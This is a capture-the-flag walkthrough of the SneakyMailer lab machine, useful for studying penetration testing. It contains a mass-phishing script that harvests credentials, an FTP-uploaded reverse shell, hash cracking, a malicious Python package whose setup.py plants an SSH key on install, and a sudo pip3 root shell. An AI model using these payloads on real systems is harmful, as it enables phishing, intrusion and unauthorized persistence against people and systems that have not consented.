## SneakyMailer

Difficulty: Medium

### User Flag

#### Foothold

```
rustscan -a 10.10.10.197 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/98284ede-b66a-42c7-a999-767d31614e63)

<br>

To access the website, add http://sneakycorp.htb/ to hosts.

On the team.php page we can enumerate some e-mails. Paste the table to a text file and use awk to get only the necessary.

```
awk -F"\t" '{print $4}' team.txt > emails.txt

# We could validate this e-mails in smtp
smtp-user-enum -U emails.txt 10.10.10.197 25
```

![website](https://github.com/b1d0ws/OSCP/assets/58514930/de557d43-40af-44ef-a343-c2a41f3e766d)

<br>

Project Update section on main page says for the users to look at their emails. We can create a script to phish this users.

```bash
for email in $(cat emails.txt);
do
  swaks \
    --from support@sneakymailer.htb \
    --to $email \
    --header 'Subject: Please Register Your Account' \
    --body 'http://10.10.14.21/register.php' \
    --server sneakycorp.htb
done
```

```
./phishing.sh

# The -k option is used to not close the listener after one connection is made
sudo nc -lvnkp 80
```

![phishingSh](https://github.com/b1d0ws/OSCP/assets/58514930/9f663272-69e7-47b3-8b25-30dacadeeb5c)

![paulCredential](https://github.com/b1d0ws/OSCP/assets/58514930/92021377-b9c1-499d-9c79-86339d5c9955)

![urlDecode](https://github.com/b1d0ws/OSCP/assets/58514930/422b5d9d-6186-4eba-a513-ef627b4f851f)

<br>

With this credentials, we can login in IMAP with Evolution and find another credentials for FTP.

![ftpCredentials](https://github.com/b1d0ws/OSCP/assets/58514930/05ec7958-4032-4498-9a18-5cdbffce5e65)

<br>

FTP dir seems to be the location for the webpage, but under /dev. Enumerating subdomain, we discover that dev.sneakycorp.htb exists.  

Upload a reverse shell and access http://dev.sneakycorp.htb/shell.php.

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.sneakycorp.htb" -u http://sneakycorp.htb
```

![subdomainEnumeration](https://github.com/b1d0ws/OSCP/assets/58514930/0ea5b4c0-3e5b-4aa3-8ed9-47c9c473ac1f)

![ftpPut](https://github.com/b1d0ws/OSCP/assets/58514930/5623b2b7-3c3e-4d07-85de-e9cc4347f8a8)

<br>

#### Low User

There is a another webserver pypi.sneakycorp.htb running,

PyPI server is acessible on port 8080 and asks for credentials,

Find a password password inside /var/www/pypi.sneakycorp.htb/.htpasswd and crack with hashcat.

```
hashcat -m 1600 pypi /usr/share/wordlists/rockyou.txt --user

# Creating ssh keys to use later
ssh-keygen -f low
```

![pythonServer](https://github.com/b1d0ws/OSCP/assets/58514930/5137bd0b-f745-42ad-9347-3030905df999)

![htpasswd](https://github.com/b1d0ws/OSCP/assets/58514930/74808cec-3722-4fe4-b82d-60da7134312c)

![hashcat](https://github.com/b1d0ws/OSCP/assets/58514930/b5e560e3-a4ad-4dcf-84ee-ce04ace09c94)

<br>

We need to create a custom package to upload on PyPI server and get remote command

```
mkdir test
cd test
mkdir package
touch setup.cfg; touch setup.py
touch README.md; touch package/__init__.py

setup.py

from setuptools import setup
import os
try:
        os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsC78LUEtOvubTqZxtYCRSTZXOKlRJbNWYGnCd9/riLVvqcoD9t4s2RF/y34cREVzLx0W4GSak1XO+KDPUppkpv5JDpDUnyCOUhfuMFie+XHBZ4tNYwUqGOZlfsV3AAiTUge+O0hAUBeVjMCn7e2kGiq9LJNlzvImwVyyck0VbXIqI69ArN3ixkD0rbLz+PRNOlxGKQmozSvEKwkg1QMMD2GdXVRkDPe5PneyZrSc9tPs/SYVnNmggZ1SUqiMPNLz4DPz+zAzn/0g7INVXeF1tJmqgVGZdE1T6+17QDK7NQEBsIN3lNVDHFw2NPmA/ptTOaU45jhGmV+fzpK+s4F7EBhdIWZVExrPzbKU2aTr23lLV16U1pLc7WRza4glv64oqk/lzygkBEOncbIfe0caqiNow9ojH6Gi4+FxB40gwa3K5VDc3bzkrsi9Tdz1Uv2wGOEEo8xO1sfBkMs/yEY/e5HsLB45rOLtjTLJtTqw8C0T7CCjkUdUp66gZru3a/rM=' >> ~/.ssh/authorized_keys")
except:
        pass
setup(
    name='package',
    packages=['package'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example']
    )

setup.cfg

[metadata]  
description-file = README.md

__init__.py

def hello_word():  
    print("hello world")

export HOME=`pwd`
touch ~/.pypirc

.pypirc

[distutils]
index-servers =
  pypi
  linode
[pypi]
username:
password:
[linode]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui

# Uploading the package
python setup.py sdist upload -r linode

# Login
ssh -i low low@10.10.10.197
```

![pypi](https://github.com/b1d0ws/OSCP/assets/58514930/43c42494-e1d6-4bae-9233-085fb9a1e5dd)

<br>

### Root Flag

```
sudo -l
(root) NOPASSWD: /usr/bin/pip3

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/bin/pip3 install $TF
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/a9f69679-c375-4785-9dcb-3c428f454e01)
